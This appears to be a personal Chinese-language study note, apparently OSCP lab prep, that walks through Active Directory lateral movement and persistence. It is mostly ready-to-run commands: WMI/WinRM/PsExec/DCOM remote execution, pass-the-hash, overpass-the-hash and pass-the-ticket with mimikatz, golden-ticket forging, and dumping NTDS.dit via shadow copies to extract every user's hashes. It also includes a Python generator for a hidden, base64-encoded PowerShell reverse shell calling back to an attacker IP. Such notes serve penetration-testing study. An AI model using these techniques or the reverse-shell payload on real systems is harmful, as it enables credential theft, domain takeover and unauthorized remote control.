# Lateral Movement
NTLM和Keberos不实用明文密码进行验证，并且微软的原生工具不支持使用密码hash进行身份认证。

## Active Directory Lateral Movement Techniques
Lateral时候记得提醒自己，enumerating!! 
### WMI && WinRM
#### WMI
Windows Management Instrumentation(WMI)，是一种面向对象的功能，方便任务自动化

WMI可以通过Win32_Process类的Create方法创建进程。他通过RPC在135上进行远程访问，并使用较高范围的端口进行数据传输

条件：需要一个属于管理员本地组的凭据，这个凭据也可以是域用户

```
cmd> wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"

ps> 
###传入用户名密码
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString; 

###通过_New-cimSession创建一个Common Information Model(CIM)
###specify DCOM as the protocol
$options = New-CimSessionOption -Protocol Dcom
###creat a new session
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
###自定义exec
$command = "calc"; 

###invoke the method
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command};

```

py脚本生成base64编码的powershell reverse shell命令 
/Users/baicai/Desktop/OSCP/smallTools/reverseShell_powershell.py
```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmd)

```

#### WinRM
和WMI能实现的功能一样，WinRM也可以远程管理主机，它通过http和https叫唤xml消息。使用5985进行加密的HTTPS连接
winRM在winRS等内置程序中实现。

WinRS条件：域用户需要是目标主机上管理员或远程管理用户组的一部分

使用
```
winRS只使用于域用户   -r是目标主机，-u -p是目标主机目标域用户
cmd> winRS -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
执行任意命令反弹shell到kali
###PowerShell还具有名为PowerShell远程的WinRM内置功能。可以通过New-PSSession来调用
kali ps>
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force; 
$credential = New-Object System.Management.Automation.PSCredential;
New-PSSession -ComputerName 10.10.10.10 -Credential $credential

###会话交互
Enter-PSSession id值

```

### PsExec
PsExec是`https://docs.microsoft.com/en-us/sysinternals`套件中的一个工具

条件：后两个在winserver上默认开启  
目标机器的用户需要是本地管理员组的一部分；  
ADMIN$共享必须可用；    
文件和打印机共享必须打开。

过程：  
将psexecsvc.exe写到C:   
在远程主机上创建并生成一个服务  
将所请求的程序/命令作为psexecsvc.exe的子进程运行

利用
```
ps> ./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```


### Pass the Hash  (PtH)
PtH允许攻击者使用NTLM hash来进行身份认证。但仅仅是用于NTLM，不使用于Keeberos

原理：使用SERver Message Blook（SMB）协议连接到vic，使用NTLM进行身份验证

条件：  
开445   
需要本地管理员权限
ADMIN$共享必须可用；    
开win打文件和打印机共享功能

```
kali> /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```


这种方法适用于Active Directory域帐户和内置的本地管理员帐户。然而，由于2014年的安全更新，这种技术无法用于验证其他本地管理员帐户。

### Overpass the Hash
目标：通过Overpass the Hash获取完整的Kerbros TGT,使用TGT来获取TGS
就是将获取到的NTLM hash转换成Kerbros TGT


条件：
需要域用户的NTLM hash，

利用
```
###以wang的身份登陆到机器，再以jen的身份运行一个需要身份验证的进程
privilege::debug    
sekurlsa::logonpasswords        会获取到jen用户的NTLM hash


###在不通过网络进行NTLM身份认证的情况下获取TGT
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell

运行后会有一个新powershell会话，并且可以以jen的身份执行命令。但执行whoami结果会显示为wang。因为他只检查当前进程的令牌，不检查任何导入的Kerberos票据

###此时无票据

###获取票据, 此处的命令也可以使用任何需要域权限并随后创建TGS的命令。
net use \\files04\ipc$ /user:jen

klist

###将NTLM hash转换为了Kereros TGT，可以使用任何依赖于Kerberos身份验证（而不是NTLM）的工具,如psExec

###PsExec可以远程运行命令，但不接受密码哈希。由于我们已生成了Kerberos票据，并在PowerShell会话中以jen的身份操作，我们可以重用TGT以在files04主机上实现代码执行。
.\PsExec.exe \\files04 cmd

```

### Pass the Ticket
Pass the Ticket攻击利用了TGS，可以在网络上导出并重新注入，然后用于对特定服务进行身份验证。此外，如果服务票据属于当前用户，则不需要管理员权限。

利用
```
###导出内存中所有的TGT/TGS
privilege::debug
sekurlsa::tickets /export

###检查导出的ticket
dir *.kirbi
样例如下：
    -a---- 9/14/2022 6:24 AM 1561 [0;12bd0]-0-0-40810000-dave@cifs-
    web04.kirbi
    -a---- 9/14/2022 6:24 AM 1505 [0;12bd0]-2-0-40c10000-dave@krbtgt-
    CORP.COM.kirbi

###筛选攻击的服务的ticket
###注入票据
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

###检查
klist
```

### DCOM
Distributed Component Object Model(DCOM) 分布式组件对象模型

Microsoft Component Object Model(COM)是一种为了创建相互交互的软件组件的系统。最初是为了同一进程或跨进程交互设计的，但后来被扩展为DCOM，以实现在网络上多台计算机之间的交互。

DCOM横向基于Microsoft Management Console(MMC) COM应用程序，这个用于对win进行脚本自动化。

原理：MMC应用程序允许使用 在Document.ActiveView属性下公开的ExecuteShellCommand方法 创建应用程序对象，该方法允许执行任意命令。只要经过授权的用户具有权限，这是本地管理员的默认设置。


```
###创建应用程序对象并保存到$dcom对象中    传入目标IP
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
###使用该方法将参数传进去
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell反弹生成 py脚本","7")

```


## Active Directory Persistence
持久化

### Golden Ticket
secret key是krbtgt的域用户账户的密码hash，如果能够获取到其密码hash，就可以自己创建自己制作的自定义TGT，也被叫做黄金票据。   
将黄金票据注入内存不需要任何admin权限，在未加入域的计算及上也可以

条件：
账户在域管理员组内，或者是域控制器本身

利用：
```
登到dc
###拿到krbtgt的NTLM hash和域SID
privilege::debug
lsadump::lsa /patch

###删除现有的票据
kerberos::purge

###注入黄金票据     jen为要登陆的用户（已存在），corp.com为域名，1693c6cefafffc7af11ef34d1c788f47为krbtgt的NTLM hash，S-1-5-21-1987370270-658905905-1781884369为域SID
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

###启一个新cmd
misc::cmd

继续横向的时候要使用主机名进行连接，不然会使用NTLM验证，横向失败。
```

### Shadow Copies
影子副本，也被称为卷影子服务（Volume Shadow Service）（VSS），是微软的一项备份技术，允许创建文件或整个卷的快照。

作为域管理员，我们有能力滥用vshadow工具来创建一个影子副本，从而允许我们提取Active Directory数据库NTDS.dit数据库文件。一旦我们获得了该数据库的副本，我们就可以在我们的本地Kali机器上离线提取每个用户的凭据。

条件：
域管权限

利用：
```
###创建影子副本 -nw禁用写入器，加快备份创建速度    -p指定备份的卷
vshadow.exe -nw -p C:

##示例
- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

###将整个AD数据库从影子副本复制到C盘根目录
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

###保存Windows注册表中的SYSTEM hive，将这两个bak文件复制到Kali机器上。
reg.exe save hklm\system c:\system.bak

###本地解析、提取credential。  -ntds指定ntds.dit文件，-system指定system文件，LOCAL指定本地解析
kali> impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

成功获取了每个AD用户的NTLM哈希和Kerberos密钥

```






